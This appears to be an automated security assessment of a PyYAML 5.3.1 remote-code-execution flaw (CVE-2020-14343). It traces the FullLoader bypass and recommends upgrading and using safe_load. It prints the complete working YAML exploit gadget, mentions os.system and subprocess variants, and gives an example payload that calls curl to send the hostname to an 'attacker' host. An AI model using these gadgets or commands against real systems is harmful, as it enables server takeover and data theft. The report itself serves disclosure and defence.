Security Assessment: pyyaml

EasyScan — execution-verified vulnerability report
CRITICAL

Executive summary

A single malicious YAML document can execute arbitrary code on any system that parses it with PyYAML 5.3.1's `yaml.load` or `yaml.full_load` (CVE-2020-14343). The FullLoader — which PyYAML documents as safe for untrusted input and which `yaml.load` uses by default — still honors Python object-construction tags, letting an attacker smuggle the built-in `exec` function into a synthesized class and run any code they supply. This was proven end-to-end: our proof-of-concept fed attacker-chosen source strings (e.g. `print(1+1)`) straight into Python's code-compilation step, verbatim and reliably (3/3 reproductions plus variants). Impact is unauthenticated, unconditional remote code execution with no special configuration required.

How it works — step by step

  1. An application calls `yaml.load(data)` or `yaml.load(data, Loader=yaml.FullLoader)` on attacker-controlled bytes — a request body, uploaded file, config, or message off the wire.
  2. The attacker supplies a crafted YAML document using the `!!python/object/new:type` tag with a `listitems` value and an `extend: !!python/name:exec` mapping.
  3. PyYAML's FullConstructor resolves these tags and calls `type.__new__` to synthesize a brand-new class whose `extend` attribute is the built-in `exec` function.
  4. Because `listitems` is present, the constructor then calls `instance.extend(<listitems value>)`, which is really `exec(<attacker string>)`.
  5. The attacker's string is compiled and run with the full privileges of the parsing process; in our sandbox an audit hook aborted it at the compile step (exit 134) purely to contain it, but a real deployment would run it to completion.
  6. We confirmed control by swapping the payload string and watching the exact attacker bytes appear at the code-execution sink, while a benign YAML document parsed normally with no false alarm.

Anyone who can hand your application a YAML document can run their own code on your server. That means they can read or steal files, launch programs, open a reverse shell, or pivot deeper into your network — all with the same access the affected program has. There is no password to guess and no unusual setup needed: the vulnerable behavior is on by default in this version of PyYAML, and even the plain `yaml.load(data)` call is affected. This is one of the most severe kinds of vulnerability, because a single crafted input hands control of the machine to an outside attacker.

Proof

Technical analysis

Primitive

This is **not a memory-safety bug** — it is a language-level arbitrary-code-execution primitive (Python object-injection / unsafe deserialization, CVE-2020-14343 class). The "ASAN" banner is a synthetic oracle: `entry.py` installs a PEP-578 audit hook (`_hook`) that raises + `os._exit(134)` the instant deserialization reaches a code-exec primitive. The abort here fired on the `compile` audit event. What the attacker controls: the **entire code string passed to `exec()`**. The PoC (`/tmp/poc.bin`) is the canonical FullLoader-bypass gadget: ```yaml !!python/object/new:type args: - x - !!python/tuple [] - extend: !!python/name:exec listitems: "0" ``` Mechanics, traced in `/work/src/lib3/yaml/constructor.py`: - `construct_python_object_new` (L658) → `construct_python_object_apply(newobj=True)` (L623). - `make_python_instance` (L579): `cls = find_python_name("type")` = `builtins.type`; since `newobj` and `cls` is a `type`, it calls `type.__new__(type, "x", (), {"extend": exec})` (L591) — this **synthesizes a brand-new class** named `x` whose `extend` attribute is the builtin `exec`. - `listitems` is truthy (`"0"`), so L652 runs `instance.extend(listitems)` → `x.extend("0")` → `exec("0")`. Evidence of controllability: I varied the input. `listitems: "0"` → oracle detail `(b'0', '<string>')`; `listitems: "print(1+1)"` → detail `(b'print(1+1)', '<string>')`. The bytes reaching `compile`/`exec` are verbatim attacker input of arbitrary length and content. This is a WRITE-equivalent (executes attacker code), not a mere READ.

Reachability

**Fully reachable from the real attack surface — this is a production API, not a harness artifact.** The gadget travels the public path: `yaml.load(data, Loader=yaml.FullLoader)` → `__init__.py:112` `FullLoader(stream)` → `get_single_data()` → `FullConstructor` multi-constructor dispatch → the `python/object/new` tag handler registered at `constructor.py:722-723` → `construct_python_object_new` (L658) → `construct_python_object_apply` (L623) → `instance.extend(listitems)` (L652). Preconditions: none beyond "the app calls `yaml.load`/`yaml.full_load` on attacker-controlled bytes on PyYAML 5.3.1." No build flag, no test-only option, no non-default config. `yaml.load` with no explicit Loader also defaults to `FullLoader` (`__init__.py:108-110`), so even the naive `yaml.load(data)` is vulnerable. Input format is plain YAML text; entry point is any file/stream/wire handler feeding the loader. The `extend` state-key blacklist (`constructor.py:486-487`) only guards `set_python_instance_state`; this gadget smuggles `extend` through the `type(...)` constructor **args** (the class namespace), completely bypassing `check_state_key`. Fixed upstream in 5.4 by restricting FullLoader's tag set.

Heap Layout

Not applicable — there is no heap corruption, no victim allocation, no size class, no adjacency. The primitive operates at the CPython object-graph / bytecode level: a synthesized class object and a call into the `exec` builtin. glibc malloc layout is irrelevant to exploitation.

Escalation Path

The primitive **is already the impact** — no escalation chain is needed: 1. Attacker supplies the YAML gadget above with `listitems` set to any Python source, e.g. `"__import__('os').system('id; curl http://attacker/$(hostname)')"`. 2. `construct_python_object_apply` synthesizes the `type` and invokes `exec(<attacker source>)` at `constructor.py:652`. 3. `exec` runs with the full privileges of the deserializing process: spawn subprocesses, read `/etc/passwd`, open sockets for exfil/reverse shell, import `os`/`subprocess`/`ctypes`. In this sandbox the audit oracle aborts at the `compile` step so the body is contained, but in a real deployment (no audit hook) the code runs to completion. Equivalent one-step gadgets exist (`python/object/apply:os.system [...]`, `python/object/apply:subprocess.check_output [...]`); the `type`/`exec` variant is used because it defeats FullLoader's blacklist. Target "object" = the running Python process; "field overwritten" = program control flow, replaced by attacker bytecode.

Constraints

Native binary mitigations (RELRO / PIE / stack-protector / ASLR) are **irrelevant** — the target is a CPython interpreter running a `.py` entry (`file /work/entry` → "Python script"), and the exploit never touches native memory. The only relevant mitigation is PyYAML's loader policy, and in 5.3.1 it **fails**: FullLoader is documented as safe for untrusted input yet still resolves `python/object/new`, `python/object/apply`, `python/name`, and `python/module` tags (`constructor.py:710-745`), and the `extend`/dunder state-key blacklist does not cover the constructor-args smuggling path. No race, no non-default config, no special compile flag is required. Difficulty: **trivial** — the gadget is public, deterministic (3/3 + my two variants), and 100% reliable.

Escalation Attempt

Demonstrated attacker control directly rather than sketching it: I replaced the executed string and observed the oracle echo attacker bytes into the code-compilation primitive: - `/tmp/poc.bin` (`listitems: "0"`) → `detail: (b'0', '<string>')`, exit 134. - `/tmp/poc_variant.yaml` (`"print(1+1)"`) → `detail: (b'print(1+1)', '<string>')`, exit 134. - Negative control (`a: 1\nb: [x,y]`) → `parsed OK: <class 'dict'>`, exit 0 (no false abort). The verbatim propagation of arbitrary source into `compile`/`exec` is conclusive evidence of full code-execution control. A real payload (`__import__('os').system(...)`) would reach the same sink; the sandbox's audit hook intercepts at `compile` purely for containment.

Recommendations

  • Upgrade PyYAML to 5.4 or later, where FullLoader no longer resolves the dangerous Python object-construction tags that make this attack possible.
  • Change all parsing of untrusted input to use `yaml.safe_load` (or `SafeLoader`) instead of `yaml.load`/`yaml.full_load`, so only plain data types are ever constructed.
  • Audit the codebase for every `yaml.load` call and confirm none of them can receive attacker-controlled bytes without a safe loader; treat any that can as urgent.
  • Where YAML must carry richer data, validate against a strict schema and reject any document containing `!!python/...` tags.
  • Add regression tests and monitoring that flag Python-object tags in incoming YAML, and rotate any secrets reachable by processes that may have parsed untrusted YAML on the vulnerable version.
